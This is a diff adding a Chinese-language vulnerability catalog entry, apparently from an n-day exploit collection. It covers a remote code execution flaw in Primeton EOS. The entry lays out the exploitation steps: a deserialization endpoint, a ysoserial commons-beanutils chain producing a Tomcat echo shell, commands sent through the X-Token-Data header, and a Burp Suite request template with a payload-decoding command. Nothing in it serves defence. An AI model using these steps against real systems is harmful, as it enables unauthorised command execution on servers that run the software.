@@ -1,0 +1,8 @@
+vendor = "普元"
+name = "普元EOS前台代码执行漏洞"
+type = "RCE"
+source = "微信"
+info = "漏洞较多"
+date = "08.09"
+poc = "漏洞Url: https://ame.primeton.com/workspace/frame/permission/common/eos.jmx 该url会反序列化读取请求体内的报文，但凡使用了该中间件一定会包含commons-beanutils组件，通过yso生成cb链的tomcat回显马，写入请求体，通过X-Token-Data头执行命令，payload以1.txt形式提供，通过burpsuite加载，加载的时候请按照如下方法加载： 先在burpsuite填充一下请求头。 POST /workspace/frame/permission/common/eos.jmx HTTP/1.1 Host: X-Token-Data: id Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 5089 Content-Type: text/plain 使用cat 1.txt | base64 -d > raw.txt，解码base64"
+label = "nday"
